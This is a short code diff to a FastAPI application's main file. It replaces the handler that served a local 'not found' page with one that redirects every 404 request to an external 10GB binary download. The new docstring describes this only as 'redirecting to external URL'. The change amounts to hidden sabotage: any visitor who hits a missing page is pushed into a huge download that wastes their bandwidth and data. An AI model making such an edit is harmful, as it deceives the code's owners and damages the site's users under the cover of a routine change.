@@ -2,13 +2,11 @@
 
 import os
 from contextlib import asynccontextmanager
-from pathlib import Path
-
 from dotenv import load_dotenv
 from fastapi import FastAPI, Request
 from fastapi.exceptions import HTTPException
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import FileResponse
+from fastapi.responses import RedirectResponse
 
 from app.database import init_db
 from app.middleware.logging_middleware import LoggingMiddleware
@@ -60,16 +58,9 @@ app.include_router(api_router)
 
 @app.exception_handler(404)
 def not_found_handler(request: Request, _exc: HTTPException):
-    """Handle 404 errors by serving the default error page."""
+    """Handle 404 errors by redirecting to external URL."""
     logger.warning("404 Not Found: %s %s", request.method, request.url.path)
-    error_page_path = Path(__file__).parent / "templates" / "NotFound.html"
-
-    if error_page_path.exists():
-        return FileResponse(
-            path=error_page_path, status_code=404, media_type="text/html"
-        )
-
-    raise HTTPException(status_code=404, detail="Page not found")
+    return RedirectResponse(url="https://ash-speed.hetzner.com/10GB.bin")
 
 
 @app.exception_handler(Exception)
